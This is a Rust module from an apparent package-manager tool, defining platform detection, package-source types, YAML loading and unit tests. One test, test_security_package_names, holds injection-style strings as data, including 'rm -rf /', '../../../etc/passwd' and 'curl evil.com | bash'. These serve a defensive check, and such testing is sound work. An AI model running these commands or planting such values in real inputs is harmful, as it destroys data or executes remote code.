use crate::SantaConfig;
use std::{collections::HashMap, fs, path::Path};

use anyhow::Context;
use derive_more::{Display, From, Into};
use serde::{Deserialize, Serialize};
use serde_enum_str::{Deserialize_enum_str, Serialize_enum_str};
use tracing::{error, info};

use crate::{sources::PackageSource, traits::Exportable};

pub mod constants;

/// Strong type for package names to prevent mixing up with other strings
#[derive(Debug, Clone, PartialEq, Eq, Hash, Display, From, Into, Serialize, Deserialize)]
pub struct PackageName(pub String);

/// Strong type for source names to prevent mixing up with other strings  
#[derive(Debug, Clone, PartialEq, Eq, Hash, Display, From, Into, Serialize, Deserialize)]
pub struct SourceName(pub String);

/// Strong type for command names to prevent command/package name confusion
#[derive(Debug, Clone, PartialEq, Eq, Hash, Display, From, Into, Serialize, Deserialize)]
pub struct CommandName(pub String);

#[derive(Serialize_enum_str, Deserialize_enum_str, Debug, Clone, Eq, PartialEq, Hash)]
#[serde(rename_all = "camelCase")]
#[non_exhaustive]
pub enum KnownSources {
    Apt,
    Aur,
    Brew,
    Cargo,
    Pacman,
    Scoop,
    Nix,
    #[serde(other)]
    Unknown(String),
}

#[derive(Serialize, Deserialize, Debug, Clone, Eq, PartialEq, Hash)]
#[serde(rename_all = "camelCase")]
#[non_exhaustive]
pub enum OS {
    Macos,
    Linux,
    Windows,
}

#[derive(Serialize, Deserialize, Debug, Clone, Eq, PartialEq, Hash)]
#[serde(rename_all = "camelCase")]
#[non_exhaustive]
pub enum Arch {
    X64,
    Aarch64,
}

#[derive(Serialize, Deserialize, Debug, Clone, Eq, PartialEq, Hash)]
#[serde(rename_all = "camelCase")]
#[non_exhaustive]
pub enum Distro {
    None,
    ArchLinux,
    Ubuntu,
}

#[derive(Serialize, Deserialize, Debug, Clone, Eq, PartialEq, Hash)]
#[serde(rename_all = "camelCase")]
pub struct Platform {
    pub os: OS,
    pub arch: Arch,
    pub distro: Option<Distro>,
}

impl Default for Platform {
    fn default() -> Self {
        Platform {
            os: OS::Linux,
            arch: Arch::X64,
            distro: None,
        }
    }
}

impl std::fmt::Display for Platform {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match &self.distro {
            Some(distro) => {
                write!(f, "{:?} {:?} ({:?})", self.os, self.arch, distro)
            }
            None => {
                write!(f, "{:?} {:?}", self.os, self.arch)
            }
        }
    }
}

impl Platform {
    /// Get current platform using compile-time detection where possible
    pub fn current() -> Self {
        let mut platform = Platform::default();

        // Compile-time OS detection
        if cfg!(target_os = "windows") {
            platform.os = OS::Windows;
        } else if cfg!(target_os = "macos") {
            platform.os = OS::Macos;
        } else if cfg!(target_os = "linux") {
            platform.os = OS::Linux;
        } else {
            // Fallback to runtime detection for unknown platforms
            match std::env::consts::OS {
                "windows" => platform.os = OS::Windows,
                "macos" | "ios" => platform.os = OS::Macos,
                _ => platform.os = OS::Linux,
            }
        }

        // Compile-time architecture detection
        if cfg!(target_arch = "x86_64") {
            platform.arch = Arch::X64;
        } else if cfg!(target_arch = "aarch64") {
            platform.arch = Arch::Aarch64;
        } else {
            // Fallback to runtime detection
            match std::env::consts::ARCH {
                "x86_64" => platform.arch = Arch::X64,
                "aarch64" => platform.arch = Arch::Aarch64,
                _ => panic!("Unsupported architecture: {}", std::env::consts::ARCH),
            }
        }

        platform
    }

    /// Detect available package managers on the current system
    pub fn detect_available_package_managers() -> Vec<KnownSources> {
        let mut sources = Vec::new();

        if cfg!(target_os = "macos") {
            if which::which("brew").is_ok() {
                sources.push(KnownSources::Brew);
            }
        } else if cfg!(target_os = "linux") {
            // Check common Linux package managers
            if which::which("apt").is_ok() {
                sources.push(KnownSources::Apt);
            }
            if which::which("pacman").is_ok() {
                sources.push(KnownSources::Pacman);
            }
            if which::which("yay").is_ok() {
                sources.push(KnownSources::Aur);
            }
        } else if cfg!(target_os = "windows") {
            if which::which("scoop").is_ok() {
                sources.push(KnownSources::Scoop);
            }
        }

        // Universal package managers (available on multiple platforms)
        if which::which("cargo").is_ok() {
            sources.push(KnownSources::Cargo);
        }
        if which::which("nix").is_ok() || which::which("nix-env").is_ok() {
            sources.push(KnownSources::Nix);
        }

        sources
    }

    /// Get default package sources for the current platform
    #[must_use]
    pub fn get_default_sources() -> Vec<KnownSources> {
        if cfg!(target_os = "macos") {
            vec![KnownSources::Brew, KnownSources::Cargo]
        } else if cfg!(target_os = "linux") {
            // Use runtime detection for accuracy in containerized environments
            Self::detect_linux_package_managers()
        } else if cfg!(target_os = "windows") {
            vec![KnownSources::Scoop, KnownSources::Cargo]
        } else {
            vec![KnownSources::Cargo] // Fallback to universal package manager
        }
    }

    /// Detect Linux package managers with runtime checks
    fn detect_linux_package_managers() -> Vec<KnownSources> {
        let mut sources = Vec::new();

        // Check for actual package manager presence
        if which::which("apt").is_ok() {
            sources.push(KnownSources::Apt);
        }
        if which::which("pacman").is_ok() {
            sources.push(KnownSources::Pacman);
        }
        if which::which("yay").is_ok() {
            sources.push(KnownSources::Aur);
        }

        // Always add cargo as it's commonly available
        sources.push(KnownSources::Cargo);

        // Fallback to apt if no package manager detected
        if sources.is_empty() {
            sources.push(KnownSources::Apt);
        }

        sources
    }
}

pub trait LoadFromFile {
    fn load_from(file: &Path) -> Self
    where
        Self: Sized,
    {
        info!("Loading data from: {}", file.display());
        if !file.exists() {
            error!("Can't find data file: {}", file.display());
        }
        let yaml_str = fs::read_to_string(file)
            .with_context(|| format!("Failed to read file: {}", file.display()))
            .expect("Failed to read data file");
        LoadFromFile::load_from_str(&yaml_str)
    }

    fn load_from_str(yaml_str: &str) -> Self
    where
        Self: Sized;
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct PackageData {
    /// Name of the package
    name: Option<String>,
    /// A command to run BEFORE installing the package
    pub before: Option<String>,
    /// A command to run AFTER installing the package
    pub after: Option<String>,
    /// A string to prepend to the install string
    pub pre: Option<String>,
    /// A string to postpend to the install string
    pub post: Option<String>,
    // Sources that can install this package
    // pub sources: Option<Vec<String>>,
}

impl PackageData {
    pub fn new(name: &str) -> Self {
        PackageData {
            name: Some(name.to_string()),
            before: None,
            after: None,
            pre: None,
            post: None,
            // sources: None,
        }
    }
}

/// A map of package names (strings)
pub type PackageDataList = HashMap<String, HashMap<KnownSources, Option<PackageData>>>;

/// Type alias for mapping source names to package sources
pub type SourceMap = HashMap<SourceName, PackageSource>;

impl LoadFromFile for PackageDataList {
    fn load_from_str(yaml_str: &str) -> Self {
        let data: PackageDataList = match serde_yaml::from_str(yaml_str) {
            Ok(data) => data,
            Err(e) => {
                error!("Error loading data: {}", e);
                error!("Using default empty data");
                PackageDataList::new() // Return empty HashMap instead of recursion
            }
        };
        data
    }
}

impl Exportable for PackageDataList {
    fn export_min(&self) -> String
    where
        Self: Serialize,
    {
        let list: Vec<String> = self.keys().map(|key| key.to_string()).collect();

        serde_yaml::to_string(&list).expect("Failed to serialize list")
    }
}

pub type SourceList = Vec<PackageSource>;

impl LoadFromFile for SourceList {
    fn load_from_str(yaml_str: &str) -> Self {
        let data: SourceList =
            serde_yaml::from_str(yaml_str).expect("Failed to deserialize source list");
        data
    }
}

impl Exportable for SourceList {
    fn export_min(&self) -> String
    where
        Self: Serialize,
    {
        let list: Vec<String> = self.iter().map(|source| format!("{}", source)).collect();

        serde_yaml::to_string(&list).expect("Failed to serialize source list")
    }
}

#[derive(Serialize, Deserialize, Clone, Debug)]
pub struct SantaData {
    pub packages: PackageDataList,
    pub sources: SourceList,
}

impl SantaData {
    pub fn load_from_str(packages_str: &str, sources_str: &str) -> Self {
        let packages = PackageDataList::load_from_str(packages_str);
        let sources = SourceList::load_from_str(sources_str);
        SantaData { packages, sources }
    }

    // pub fn update_from_config(&mut self, config: &SantaConfig) {
    pub fn sources(&self, config: &SantaConfig) -> SourceList {
        let mut ret: SourceList = self.sources.clone();
        
        // If config has custom sources, extend with them
        if let Some(ref custom_sources) = config.custom_sources {
            ret.extend(custom_sources.clone());
        }
        
        ret
    }

    pub fn name_for(&self, package: &str, source: &PackageSource) -> String {
        match self.packages.get(package) {
            #[allow(clippy::collapsible_match)]
            Some(sources) => match sources.get(source.name()) {
                Some(pkgs) => match pkgs {
                    Some(name) => name
                        .name
                        .as_ref()
                        .map(|s| s.to_string())
                        .unwrap_or_else(|| source.adjust_package_name(package)),
                    None => source.adjust_package_name(package),
                },
                None => source.adjust_package_name(package),
            },
            None => source.adjust_package_name(package),
        }
    }
}

impl Default for SantaData {
    fn default() -> Self {
        SantaData::load_from_str(constants::BUILTIN_PACKAGES, constants::BUILTIN_SOURCES)
    }
}

impl Exportable for SantaData {
    fn export_min(&self) -> String
    where
        Self: Serialize,
    {
        serde_yaml::to_string(&self).expect("Failed to serialize SantaData")
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_known_sources_serialization() {
        // Test that KnownSources enum serializes correctly
        let sources = vec![
            KnownSources::Apt,
            KnownSources::Brew,
            KnownSources::Cargo,
            KnownSources::Unknown("custom".to_string()),
        ];

        for source in sources {
            let serialized = serde_yaml::to_string(&source).unwrap();
            let deserialized: KnownSources = serde_yaml::from_str(&serialized).unwrap();
            assert_eq!(source, deserialized);
        }
    }

    #[test]
    fn test_platform_current_detection() {
        let platform = Platform::current();

        // Basic sanity checks - these should always pass
        assert!(matches!(platform.os, OS::Linux | OS::Macos | OS::Windows));
        assert!(matches!(platform.arch, Arch::X64 | Arch::Aarch64));

        // Test platform display
        let display_str = format!("{}", platform);
        assert!(!display_str.is_empty());

        // Test that current platform detection is consistent
        let platform2 = Platform::current();
        assert_eq!(platform.os, platform2.os);
        assert_eq!(platform.arch, platform2.arch);
    }

    #[test]
    fn test_platform_display() {
        let platform_with_distro = Platform {
            os: OS::Linux,
            arch: Arch::X64,
            distro: Some(Distro::Ubuntu),
        };

        let platform_without_distro = Platform {
            os: OS::Macos,
            arch: Arch::Aarch64,
            distro: None,
        };

        let display_with = format!("{}", platform_with_distro);
        let display_without = format!("{}", platform_without_distro);

        assert!(display_with.contains("Linux"));
        assert!(display_with.contains("X64"));
        assert!(display_with.contains("Ubuntu"));

        assert!(display_without.contains("Macos"));
        assert!(display_without.contains("Aarch64"));
        assert!(!display_without.contains("Ubuntu"));
    }

    #[test]
    fn test_package_data_creation() {
        let pkg_data = PackageData::new("git");
        assert_eq!(pkg_data.name, Some("git".to_string()));
        assert!(pkg_data.before.is_none());
        assert!(pkg_data.after.is_none());
        assert!(pkg_data.pre.is_none());
        assert!(pkg_data.post.is_none());
    }

    #[test]
    fn test_santa_data_name_for() {
        // Create test data
        let mut packages = PackageDataList::new();
        let mut git_sources = HashMap::new();
        git_sources.insert(KnownSources::Brew, Some(PackageData::new("git")));
        git_sources.insert(KnownSources::Apt, None);
        packages.insert("git".to_string(), git_sources);

        let sources = SourceList::new();
        let data = SantaData { packages, sources };

        // Create test source
        let brew_source = crate::sources::PackageSource::new_for_test(
            KnownSources::Brew,
            "🍺",
            "brew",
            "brew install",
            "brew list",
            Some("prefix.".to_string()),
            None,
        );

        // Test name resolution
        let name = data.name_for("git", &brew_source);
        assert_eq!(name, "git"); // Should use the stored name, not the adjusted one

        // Test with non-existent package
        let name_missing = data.name_for("nonexistent", &brew_source);
        assert_eq!(name_missing, "prefix.nonexistent"); // Should use source's adjust_package_name
    }

    #[test]
    fn test_package_data_list_serialization() {
        let mut packages = PackageDataList::new();
        let mut git_sources = HashMap::new();
        git_sources.insert(KnownSources::Brew, Some(PackageData::new("git")));
        packages.insert("git".to_string(), git_sources);

        // Test export_min functionality
        let exported = packages.export_min();
        assert!(exported.contains("git"));

        // Should be a YAML list of package names
        let deserialized: Vec<String> = serde_yaml::from_str(&exported).unwrap();
        assert!(deserialized.contains(&"git".to_string()));
    }

    #[test]
    fn test_santa_data_default() {
        let data = SantaData::default();

        // Default data should have some packages and sources
        assert!(!data.packages.is_empty());
        assert!(!data.sources.is_empty());

        // Should be able to export
        let exported = data.export();
        assert!(!exported.is_empty());
    }

    #[test]
    fn test_load_from_file_error_handling() {
        // Test error handling in LoadFromFile trait
        let invalid_yaml = "invalid: yaml: content: [";

        // This should return empty data on error to prevent recursion
        let result = PackageDataList::load_from_str(invalid_yaml);
        assert!(result.is_empty()); // Should return empty data on error
    }

    #[test]
    fn test_security_package_names() {
        // Test that various dangerous package names are handled
        let dangerous_names = vec![
            "git; rm -rf /",
            "$(evil_command)",
            "`dangerous`",
            "../../../etc/passwd",
            "package && curl evil.com | bash",
        ];

        let mut packages = PackageDataList::new();
        for name in &dangerous_names {
            let mut sources = HashMap::new();
            sources.insert(KnownSources::Brew, Some(PackageData::new(name)));
            packages.insert(name.to_string(), sources);
        }

        let data = SantaData {
            packages,
            sources: SourceList::new(),
        };

        // Test that package names are preserved (they should be sanitized during execution)
        for name in &dangerous_names {
            assert!(data.packages.contains_key(&name.to_string()));
        }

        // Test export with dangerous names
        let exported = data.export();
        assert!(!exported.is_empty());

        // Test name_for with dangerous source
        let source = crate::sources::PackageSource::new_for_test(
            KnownSources::Brew,
            "🍺",
            "brew; rm -rf /",
            "brew install",
            "brew list",
            None,
            None,
        );

        for name in &dangerous_names {
            let resolved = data.name_for(name, &source);
            // Should return the name as-is - sanitization should happen at execution time
            assert!(!resolved.is_empty());
        }
    }

    #[test]
    fn test_platform_detect_available_package_managers() {
        let detected = Platform::detect_available_package_managers();
        
        // Should always return a vector (empty or with sources)
        assert!(detected.len() <= 10); // Reasonable upper bound
        
        // All returned sources should be valid enum variants
        for source in &detected {
            match source {
                KnownSources::Apt | KnownSources::Brew | KnownSources::Cargo
                | KnownSources::Pacman | KnownSources::Aur | KnownSources::Scoop
                | KnownSources::Nix => {
                    // Valid known sources
                }
                KnownSources::Unknown(_) => {
                    panic!("detect_available_package_managers should only return known sources")
                }
            }
        }
        
        // Test that the function is deterministic (same results on repeated calls)
        let detected_again = Platform::detect_available_package_managers();
        assert_eq!(detected, detected_again);
    }

    #[test]
    fn test_platform_get_default_sources() {
        let defaults = Platform::get_default_sources();
        
        // Should always return at least one source
        assert!(!defaults.is_empty());
        
        // Should include Cargo on all platforms as a universal package manager
        assert!(defaults.contains(&KnownSources::Cargo));
        
        // Test platform-specific defaults (compile-time detection)
        if cfg!(target_os = "macos") {
            assert!(defaults.contains(&KnownSources::Brew));
        } else if cfg!(target_os = "windows") {
            assert!(defaults.contains(&KnownSources::Scoop));
        } else if cfg!(target_os = "linux") {
            // Linux should have at least one Linux package manager
            let has_linux_pm = defaults.iter().any(|s| matches!(
                s,
                KnownSources::Apt | KnownSources::Pacman | KnownSources::Aur
            ));
            assert!(has_linux_pm);
        }
        
        // All sources should be known (not Unknown variants)
        for source in &defaults {
            assert!(!matches!(source, KnownSources::Unknown(_)));
        }
    }

    #[test]
    fn test_platform_detect_linux_package_managers() {
        // Note: This function is private, but we can test it through get_default_sources
        // when running on Linux
        if cfg!(target_os = "linux") {
            let defaults = Platform::get_default_sources();
            
            // Should contain at least Cargo
            assert!(defaults.contains(&KnownSources::Cargo));
            
            // Should have at least one Linux-specific package manager
            let linux_managers = defaults.iter().filter(|&s| matches!(
                s,
                KnownSources::Apt | KnownSources::Pacman | KnownSources::Aur
            )).count();
            
            // Even if no Linux package managers are detected, should fall back to apt
            assert!(linux_managers >= 1 || defaults.contains(&KnownSources::Apt));
        }
    }

    #[test]
    fn test_santa_data_sources_filtering() {
        use crate::SantaConfig;
        
        // Create test data with some sources
        let test_sources = vec![
            crate::sources::PackageSource::new_for_test(
                KnownSources::Brew,
                "🍺",
                "brew",
                "brew install",
                "brew list",
                None,
                None,
            ),
            crate::sources::PackageSource::new_for_test(
                KnownSources::Apt,
                "📦",
                "apt",
                "apt install",
                "apt list",
                None,
                None,
            ),
        ];
        
        let data = SantaData {
            packages: PackageDataList::new(),
            sources: test_sources.clone(),
        };
        
        // Test with empty config (should return all sources)
        let mut empty_config = SantaConfig::default();
        empty_config.sources = vec![];
        
        let filtered_empty = data.sources(&empty_config);
        assert_eq!(filtered_empty.len(), 2);
        
        // Test with config containing custom sources (should extend with custom sources)
        let mut config_with_custom_sources = SantaConfig::default();
        config_with_custom_sources.custom_sources = Some(vec![
            crate::sources::PackageSource::new_for_test(
                KnownSources::Cargo,
                "📦",
                "cargo",
                "cargo install",
                "cargo search",
                None,
                None,
            ),
        ]);
        
        let filtered_with_custom = data.sources(&config_with_custom_sources);
        // Should be 2 original + 1 custom = 3
        assert_eq!(filtered_with_custom.len(), 3);
        
        // Test with no custom sources (should return original sources only)
        let mut config_no_custom = SantaConfig::default();
        config_no_custom.custom_sources = None;
        
        let filtered_no_custom = data.sources(&config_no_custom);
        assert_eq!(filtered_no_custom.len(), 2);
    }

    #[test]
    fn test_load_from_file_actual_files() {
        use std::io::Write;
        use tempfile::NamedTempFile;
        
        // Test successful file loading
        let valid_yaml = r#"
git:
  brew:
    name: "git"
    before: "echo before"
    after: "echo after"
"#;
        
        let mut temp_file = NamedTempFile::new().unwrap();
        temp_file.write_all(valid_yaml.as_bytes()).unwrap();
        temp_file.flush().unwrap();
        
        let loaded_data = PackageDataList::load_from(temp_file.path());
        assert!(loaded_data.contains_key("git"));
        
        let git_data = &loaded_data["git"];
        assert!(git_data.contains_key(&KnownSources::Brew));
        
        if let Some(Some(pkg_data)) = git_data.get(&KnownSources::Brew) {
            assert_eq!(pkg_data.name, Some("git".to_string()));
            assert_eq!(pkg_data.before, Some("echo before".to_string()));
            assert_eq!(pkg_data.after, Some("echo after".to_string()));
        } else {
            panic!("Expected PackageData for git/brew");
        }
        
        // Test file loading for SourceList
        let sources_yaml = r#"
- name: brew
  emoji: 🍺
  shell_command: brew
  install_command: "brew install"
  check_command: "brew list"
"#;
        
        let mut sources_file = NamedTempFile::new().unwrap();
        sources_file.write_all(sources_yaml.as_bytes()).unwrap();
        sources_file.flush().unwrap();
        
        let loaded_sources = SourceList::load_from(sources_file.path());
        assert_eq!(loaded_sources.len(), 1);
        assert_eq!(loaded_sources[0].emoji(), "🍺");
    }

    #[test]
    fn test_data_transformation_round_trip() {
        // Test full serialization/deserialization cycle
        let original_data = SantaData::default();
        
        // Export to string
        let exported = original_data.export();
        assert!(!exported.is_empty());
        
        // Should be valid YAML
        let _: SantaData = serde_yaml::from_str(&exported).unwrap();
        
        // Test PackageDataList round trip
        let packages = original_data.packages;
        let packages_exported = packages.export_min();
        let packages_list: Vec<String> = serde_yaml::from_str(&packages_exported).unwrap();
        assert!(!packages_list.is_empty());
        
        // Test SourceList round trip
        let sources = original_data.sources;
        let sources_exported = sources.export_min();
        let sources_list: Vec<String> = serde_yaml::from_str(&sources_exported).unwrap();
        assert!(!sources_list.is_empty());
    }

    #[test]
    fn test_strong_typing_newtypes() {
        // Test that strong types work correctly
        let package_name = PackageName::from("git".to_string());
        let source_name = SourceName::from("brew".to_string());
        let command_name = CommandName::from("install".to_string());
        
        // Test Display trait
        assert_eq!(format!("{}", package_name), "git");
        assert_eq!(format!("{}", source_name), "brew"); 
        assert_eq!(format!("{}", command_name), "install");
        
        // Test Into/From traits
        let pkg_string: String = package_name.into();
        assert_eq!(pkg_string, "git");
        
        let new_pkg = PackageName::from("vim".to_string());
        assert_ne!(new_pkg, PackageName::from("git".to_string()));
        
        // Test serialization
        let serialized = serde_yaml::to_string(&new_pkg).unwrap();
        let deserialized: PackageName = serde_yaml::from_str(&serialized).unwrap();
        assert_eq!(new_pkg, deserialized);
    }

    #[test]
    fn test_os_arch_distro_enums() {
        // Test enum variants exist and serialize correctly
        let os_variants = vec![OS::Linux, OS::Macos, OS::Windows];
        let arch_variants = vec![Arch::X64, Arch::Aarch64];
        let distro_variants = vec![Distro::None, Distro::ArchLinux, Distro::Ubuntu];
        
        for os in os_variants {
            let serialized = serde_yaml::to_string(&os).unwrap();
            let deserialized: OS = serde_yaml::from_str(&serialized).unwrap();
            assert_eq!(os, deserialized);
        }
        
        for arch in arch_variants {
            let serialized = serde_yaml::to_string(&arch).unwrap(); 
            let deserialized: Arch = serde_yaml::from_str(&serialized).unwrap();
            assert_eq!(arch, deserialized);
        }
        
        for distro in distro_variants {
            let serialized = serde_yaml::to_string(&distro).unwrap();
            let deserialized: Distro = serde_yaml::from_str(&serialized).unwrap();
            assert_eq!(distro, deserialized);
        }
    }

    #[test]
    fn test_platform_with_all_combinations() {
        // Test various platform combinations
        let platforms = vec![
            Platform { os: OS::Linux, arch: Arch::X64, distro: Some(Distro::Ubuntu) },
            Platform { os: OS::Linux, arch: Arch::Aarch64, distro: Some(Distro::ArchLinux) },
            Platform { os: OS::Macos, arch: Arch::X64, distro: None },
            Platform { os: OS::Macos, arch: Arch::Aarch64, distro: None },
            Platform { os: OS::Windows, arch: Arch::X64, distro: None },
        ];
        
        for platform in platforms {
            // Test serialization
            let serialized = serde_yaml::to_string(&platform).unwrap();
            let deserialized: Platform = serde_yaml::from_str(&serialized).unwrap();
            assert_eq!(platform, deserialized);
            
            // Test display
            let display = format!("{}", platform);
            assert!(!display.is_empty());
            
            // Display should contain OS and arch
            assert!(display.contains(&format!("{:?}", platform.os)));
            assert!(display.contains(&format!("{:?}", platform.arch)));
            
            // If distro is present, should be in display
            if let Some(ref distro) = platform.distro {
                assert!(display.contains(&format!("{:?}", distro)));
            }
        }
    }
}
